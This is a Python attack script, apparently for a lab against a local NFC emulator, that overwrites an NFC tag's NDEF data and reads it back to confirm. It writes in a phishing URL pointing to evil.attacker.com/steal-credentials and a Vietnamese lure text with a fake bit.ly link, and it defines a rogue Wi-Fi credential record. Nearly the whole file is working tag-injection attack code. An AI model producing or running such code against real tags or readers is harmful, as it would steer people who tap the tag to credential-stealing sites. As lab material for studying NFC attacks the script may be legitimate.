#!/usr/bin/env python3
import socket, json
import ndef
from colorama import Fore, init
init(autoreset=True)

NFC_HOST = '127.0.0.1'
NFC_PORT = 6011

PAYLOADS = {
    'phishing_url': ('URI', 'https://evil.attacker.com/steal-credentials'),
    'fake_wifi': (
        'MIME',
        'application/vnd.wfa.wsc',
        b'\x10\x26\x00\x01\x01\x10\x45\x00\x0cFakeHotspot\x10\x27\x00\x08password'
    ),
    'malicious_text': ('TEXT', 'He thong da cap nhat. Truy cap: bit.ly/fake'),
}

def make_payload(ptype: str) -> bytes:
    if ptype == 'phishing_url':
        r = ndef.UriRecord(PAYLOADS['phishing_url'][1])
    elif ptype == 'malicious_text':
        r = ndef.TextRecord(PAYLOADS['malicious_text'][1])
    else:
        r = ndef.UriRecord('https://evil.example.com')
    return b''.join(ndef.message_encoder([r]))

def inject(ptype: str):
    ndef_bytes = make_payload(ptype)
    s = socket.socket()
    s.settimeout(3)
    s.connect((NFC_HOST, NFC_PORT))
    payload = {'cmd': 'WRITE_NDEF', 'ndef_hex': ndef_bytes.hex()}
    s.send(json.dumps(payload).encode())
    resp = json.loads(s.recv(512).decode())
    s.close()
    return resp

print(f'{Fore.RED}=== NFC NDEF Injection Attack ===\n')
for ptype in ['phishing_url', 'malicious_text']:
    print(f'{Fore.RED}[INJECT] Overwriting with: {ptype}')
    r = inject(ptype)
    print(f'{Fore.RED}[INJECT] Result: {r}')
    s = socket.socket()
    s.settimeout(2)
    s.connect((NFC_HOST, NFC_PORT))
    s.send(json.dumps({'cmd': 'READ_NDEF'}).encode())
    verify = json.loads(s.recv(2048).decode())
    s.close()
    print(f'{Fore.RED}[VERIFY] New NDEF: {verify["records"]}\n')
